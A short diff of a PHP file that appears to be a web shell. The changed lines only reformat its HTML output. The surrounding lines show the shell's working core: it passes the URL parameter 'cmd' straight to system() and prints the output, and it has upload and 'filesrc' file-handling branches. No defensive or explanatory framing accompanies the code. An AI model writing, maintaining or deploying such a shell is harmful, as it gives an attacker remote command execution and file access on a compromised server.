@@ -96,9 +96,9 @@ echo '<font color="red">×</font><font color="white"> Cannot Upload </font><font
 }
 }
 if(isset($_GET['cmd'])){
-echo '<textarea rows="10" cols="85">';
+echo '<tr><td><textarea rows="10" cols="85">';
 echo system($_GET['cmd']);
-echo '</textarea>';
+echo '</textarea></td></tr>';
 }
 echo '</table>';
 if(isset($_GET['filesrc'])){
